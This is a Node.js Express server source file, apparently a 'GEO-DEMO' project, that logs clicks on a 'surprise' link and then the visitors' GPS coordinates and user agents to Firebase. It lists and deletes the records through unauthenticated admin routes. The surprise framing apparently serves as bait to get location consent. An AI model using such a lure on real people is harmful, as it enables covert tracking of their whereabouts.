/**
 * ============================================================
 *  GEO-DEMO — Serveur Express (Local) connecté à Firebase
 * ============================================================
 */

const express = require("express");
const cors    = require("cors");
const path    = require("path");

const { db, collection, addDoc, getDocs, deleteDoc, query, orderBy } = require("../lib/firebase");

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "../public")));

/**
 * POST /save
 * Enregistre une vue de surprise ou une position dans Firestore.
 */
app.post("/save", async (req, res) => {
  if (!db) return res.status(500).json({ success: false, message: "Firebase n'est pas configuré." });

  const { type, latitude, longitude, accuracy, timestamp } = req.body;

  // ── Gérer le clic sur "Voir la surprise" (avant la demande GPS) ──
  if (type === "view") {
    const entry = {
      type: "view",
      dateReceived: new Date().toISOString(),
      userAgent: req.headers["user-agent"] || "Inconnu",
    };
    try {
      const docRef = await addDoc(collection(db, "positions"), entry);
      entry.id = docRef.id;
      console.log(`[${new Date().toLocaleString("fr-FR")}] 👀 Clic "Surprise vue" enregistré :`, docRef.id);
      return res.json({ success: true, message: "Vue enregistrée sur Firebase.", entry });
    } catch (err) {
      return res.status(500).json({ success: false, message: err.message });
    }
  }

  // ── Gérer la réception des coordonnées GPS ──
  if (latitude === undefined || longitude === undefined) {
    return res.status(400).json({ success: false, message: "latitude et longitude sont requis." });
  }

  const entry = {
    type: "location",
    latitude:     parseFloat(latitude),
    longitude:    parseFloat(longitude),
    accuracy:     accuracy ? parseFloat(accuracy) : null,
    timestamp:    timestamp || Date.now(),
    dateReceived: new Date().toISOString(),
    userAgent:    req.headers["user-agent"] || "Inconnu",
  };

  try {
    const docRef = await addDoc(collection(db, "positions"), entry);
    entry.id = docRef.id;

    console.log(`[${new Date().toLocaleString("fr-FR")}] 📍 Nouvelle position GPS enregistrée :`, docRef.id);
    return res.json({ success: true, message: "Position enregistrée.", entry });
  } catch (err) {
    console.error("Erreur Firebase :", err);
    return res.status(500).json({ success: false, message: err.message });
  }
});

app.get("/api/positions", async (req, res) => {
  if (!db) return res.json({ success: true, count: 0, positions: [] });

  try {
    const q = query(collection(db, "positions"), orderBy("dateReceived", "desc"));
    const snapshot = await getDocs(q);
    
    const positions = [];
    snapshot.forEach((doc) => {
      positions.push({ id: doc.id, ...doc.data() });
    });

    res.json({ success: true, count: positions.length, positions });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.delete("/api/positions", async (req, res) => {
  if (!db) return res.status(500).json({ success: false, message: "Firebase n'est pas configuré." });

  try {
    const snapshot = await getDocs(collection(db, "positions"));
    const deletePromises = [];
    snapshot.forEach((doc) => deletePromises.push(deleteDoc(doc.ref)));

    await Promise.all(deletePromises);
    res.json({ success: true, message: `${snapshot.size} position(s) supprimée(s).` });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "../public/admin.html"));
});

app.listen(PORT, () => {
  console.log("════════════════════════════════════════════");
  console.log(`  GEO-DEMO — Serveur démarré`);
  console.log(`  Page publique : http://localhost:${PORT}`);
  console.log(`  Panel admin   : http://localhost:${PORT}/admin`);
  if (!db) console.log(`  ⚠️  ATTENTION : FIREBASE NON CONNECTÉ !`);
  else console.log(`  🔥 Connecté à Firebase Firestore`);
  console.log("════════════════════════════════════════════");
});
